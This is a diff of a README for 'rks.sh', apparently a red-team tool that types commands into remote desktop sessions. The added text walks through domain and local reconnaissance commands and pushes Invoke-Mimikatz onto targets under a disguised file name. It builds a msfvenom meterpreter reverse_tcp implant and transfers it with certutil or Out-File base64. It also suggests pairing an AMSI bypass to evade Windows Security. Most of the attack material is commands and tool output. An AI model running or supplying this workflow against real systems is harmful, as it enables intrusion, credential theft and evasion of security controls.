@@ -74,36 +74,85 @@ $ xfreerdp /kbd:US /clipboard /compression /dynamic-resolution /sec:rdp [/d:"<do
 
 ### 0x01 - Internal Reconnaissance
 
-- When running in command prompt
+#### Command Prompt
+
+- Local machine enumeration
 
 ```
-$ cat recon_cmds.txt
+$ cat recon_local_enum_cmds.txt
 whoami /all
 net user
 net localgroup Administrators
+ipconfig /all
+systeminfo
+
+$ ./rks.sh -c "cmd.exe" -m dialogbox
+[*] Checking one of the lines reaches 260 character limit
+[*] Executing commands...
+[+] Task completed!
+
+$ ./rks.sh -c recon_local_enum_cmds.txt
+[*] Executing commands...
+[+] Task completed!
+```
+
+- To execute a single command
+
+```
+$ ./rks.sh -c "cmd.exe /k \"whoami /all & net user & net localgroup Administrators & ipconfig /all & systeminfo\"" -m dialogbox
+[*] Checking one of the lines reaches 260 character limit
+[*] Executing commands...
+[+] Task completed!
+```
+- Active directory enumeration
+
+```
+$ cat recon_ad_enum_cmds.txt
 net user /domain
 net group "Domain Admins" /domain
 net group "Enterprise Admins" /domain
 net group "Domain Computers" /domain
 
 $ ./rks.sh -c "cmd.exe" -m dialogbox
+[*] Checking one of the lines reaches 260 character limit
+[*] Executing commands...
+[+] Task completed!
 
-$ ./rks.sh -c recon_cmds.txt
-```
-
-- When running in powershell (TODO)
-
-```
-$ cat recon_cmdlets.txt
-
-$ ./rks.sh -c "powershell.exe" -m dialogbox
-
-$ ./rks.sh -c recon_cmdlets.txt
+$ ./rks.sh -c recon_ad_enum_cmds.txt
+[*] Executing commands...
+[+] Task completed!
 ```
 
 - To execute a single command
 
-`$ ./rks.sh -c "systeminfo"`
+```
+$ ./rks.sh -c "cmd.exe /k \"net user /domain & net group \"Domain Admins\" /domain & net group \"Enterprise Admins\" /domain & net group \"Domain Computers\" /domain\""
+[*] Checking one of the lines reaches 260 character limit
+[*] Executing commands...
+[+] Task completed!
+```
+
+#### Powershell
+
+- Local machine enumeration (TODO)
+
+```
+$ cat recon_local_enum_cmdlets.txt
+
+$ ./rks.sh -c "powershell.exe" -m dialogbox
+
+$ ./rks.sh -c recon_local_enum_cmdlets.txt
+```
+
+- Active directory enumeration (TODO)
+
+```
+$ cat recon_ad_enum_cmdlets.txt
+
+$ ./rks.sh -c "powershell.exe" -m dialogbox
+
+$ ./rks.sh -c recon_ad_enum_cmdlets.txt
+```
 
 ### 0x02 - Execute Implant
 
@@ -194,7 +243,7 @@ $ ./rks.sh -c "python -c \"<payload>\""
 |  `outfileb64`  |      Windows      | Uses `Out-File` cmdlet to output the encoded base64 file's content then decodes it with `CertUtil.exe`. |
 |    `copycon`   |      Windows      | Uses `copy con` command to output the text file. |
 
-- Transfer a file remotely when pivoting in a isolated network. If you want to specify the remote path on windows be sure to include quotes. By default it uses Powershell base64 to transfer files if not specified.
+- Transfer a file remotely when pivoting in a isolated network. If you want to specify the remote path on windows be sure to include quotes. By default it uses Powershell base64 to transfer files if not specified. This also includes droppers even if the size is large. Bear in mind it'll take time to complete the file transfer.
 
 ```
 $ ./rks.sh -c "powershell.exe" -m dialogbox
@@ -204,7 +253,7 @@ $ ./rks.sh -i Invoke-Mimikatz.ps1 -o "C:\Windows\Temp\update.ps1" -m pwshb64
 [+] File transferred!
 ```
 
-- To transfer droppers you can use certutil base64 especially if it's large. Keep in mind it'll take time depending the size of the file.
+- To transfer droppers you can use `CertUtil.exe` base64 especially if it's large.
 
 `$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=4444 -f exe -o implant.exe`
 
@@ -213,10 +262,10 @@ $ ./rks.sh -i Invoke-Mimikatz.ps1 -o "C:\Windows\Temp\update.ps1" -m pwshb64
 ```
 $ ./rks.sh -c "powershell.exe" -m dialogbox
 
-$ ./rks.sh -i implant.exe -o implant.exe -m pwshcertutil
+$ ./rks.sh -i implant.exe -o implant.exe -m outfileb64
 ```
 
-- For command prompt.
+- It's also possible for legacy operating systems to transfer files such as, **Windows XP** that lacks powershell except for command prompt.
 
 ```
 $ ./rks.sh -c "cmd.exe" -m dialogbox
@@ -244,7 +293,7 @@ TODO: Fill this info after the feature has been implemented
 
 TODO: Fill this info after the feature has been implemented
 
-- You can combine AMSI Bypass with the powershell implant to circumvent **Windows Security**.
+- You can combine AMSI Bypass with the powershell implant to circumvent **Windows Security** or any security solution that was integrated with AMSI scanner.
 
 ```
 $ cat amsi_bypass.ps1
